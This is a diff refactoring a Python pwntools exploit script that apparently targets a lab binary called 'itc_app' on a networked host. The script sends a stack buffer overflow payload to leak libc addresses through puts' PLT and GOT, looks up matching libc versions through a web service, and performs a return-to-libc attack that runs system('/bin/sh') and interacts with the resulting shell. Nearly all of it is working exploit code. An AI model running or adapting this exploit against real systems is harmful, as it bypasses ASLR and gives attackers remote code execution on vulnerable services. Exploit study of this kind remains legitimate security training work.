@@ -1,14 +1,14 @@
 import json
 import requests
-from pwn import remote, u32, p32, flat, log
+from pwn import remote, u32, p32, flat, log, skip_lines
 
 # Connection Information
 conn = '192.168.0.155'
 port = 9000
 
 # Output Lines Configuration
-outputLines_b = 6
-outputLines_a = 2
+OUTPUT_LINES_BEFORE = 6
+OUTPUT_LINES_AFTER = 2
 
 # Static Configuration
 static = "./itc_app"
@@ -41,53 +41,34 @@ def handle_reverse_shell(redirect_stderr=True):
         return 300
     return 200
 
-# Leak randomised libc address via puts' PLT and function's GOT
-def leakViaPuts(conn, port,putOutAddr, msg="puts"):
+def leak_via_puts(conn, port,put_out_addr, msg="puts"):
+    """
+    Leaks randomised libc address via puts' PLT and function's GOT.
+    """
     global proc
 
     proc = remote(conn,port)
-
-    pltPutsBytes = p32(pltPuts)
-    mainAddrBytes = p32(mainAddr)
-    putOutAddrBytes = p32(putOutAddr)
-    
-    # Create and send puts(*pltOutAddr) buffer overflow payload
     payload = flat(
-        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
-        pltPutsBytes,    # Overflowed function will execute puts PLT on return
-        mainAddrBytes,   # pltPuts will execute main() on return to facilitate subsequent buffer overflows
-        putOutAddrBytes  # The first argument to puts PLT
-                         # Which is the GOT address provided which points to the randomised libc address of the function
+        b'A' * buffSize,
+        p32(pltPuts),
+        p32(mainAddr),
+        p32(put_out_addr),
     )
     
     proc.sendline(payload)
-
-    # Skip 'outputLines_b' number of lines so the next read will be the leaked value
-    for _ in range(outputLines_b):
-        try:
-            proc.recvline()
-        except EOFError:
-            pass
-    
-    # Get the leaked address
-    putsAddr = u32(proc.recv(4))
-
-    # Skip 'outputLines_a' number of lines to make a cleaner output should the program need to read any more lines after
-    for _ in range(outputLines_a):
-        try:
-            proc.recvline()
-        except EOFError:
-            pass
-    log.success("Leaked address of "+msg+": "+hex(putsAddr))
-    return putsAddr
+    skip_lines(proc, OUTPUT_LINES_BEFORE)
+    puts_addr = u32(proc.recv(4))
+    skip_lines(proc, OUTPUT_LINES_AFTER)
+    log.success(f"Leaked address of {msg}: {hex(puts_addr)}")
+    return puts_addr
 
 # Perform a return-to-libc attack executing system('/bin/sh')
 def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
     # Leak randomised libc puts addr
-    putsAddr = leakViaPuts(conn, port, gotPuts)
+    puts_addr = leak_via_puts(conn, port, gotPuts)
 
     # Get lib base addr using putsOffset
-    libc_address = putsAddr - putsOffset
+    libc_address = puts_addr - putsOffset
     log.success(f'LIBC base: {hex(libc_address)}')
 
     systemBytes = p32(systemOffset+libc_address)
@@ -106,18 +87,18 @@ def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
     log.success("Executed system('/bin/sh') overflow")
 
     # Ouput next lines so next recv will be the ouput of system('/bin/sh')
-    for _ in range(outputLines_a):
+    for _ in range(OUTPUT_LINES_AFTER):
         print(proc.recv(timeout = 0.05))
     
     # Check if reverse shell was spawned then handle user input and output for the process
     return handle_reverse_shell()
     
 # Get an array of all the potential libc versions that fit the puts and gets offsets provided
-def findPotentialLibcs(putsAddr,getsAddr):
-    data = {"symbols": {"puts": hex(putsAddr),"gets": hex(getsAddr)}}
+def findPotentialLibcs(puts_addr,getsAddr):
+    data = {"symbols": {"puts": hex(puts_addr),"gets": hex(getsAddr)}}
     response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
     responseJson = response.json()
-    log.success(f"Retrieved potential libc versions for puts: {hex(putsAddr)} and gets: {hex(getsAddr)}")
+    log.success(f"Retrieved potential libc versions for puts: {hex(puts_addr)} and gets: {hex(getsAddr)}")
     return responseJson
 
 # Find the offsets of functions and '/bin/sh' from the current libc json
@@ -147,9 +128,9 @@ def getLibcSymbolOffsets(libcJson):
 
 if __name__ == "__main__":
     
-    putsAddr = leakViaPuts(conn,port,gotPuts)
-    getsAddr = leakViaPuts(conn,port,gotGets,msg="gets")
-    responseJson = findPotentialLibcs(putsAddr,getsAddr)
+    puts_addr = leak_via_puts(conn,port,gotPuts)
+    getsAddr = leak_via_puts(conn,port,gotGets,msg="gets")
+    responseJson = findPotentialLibcs(puts_addr,getsAddr)
 
     # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
     for item in responseJson:
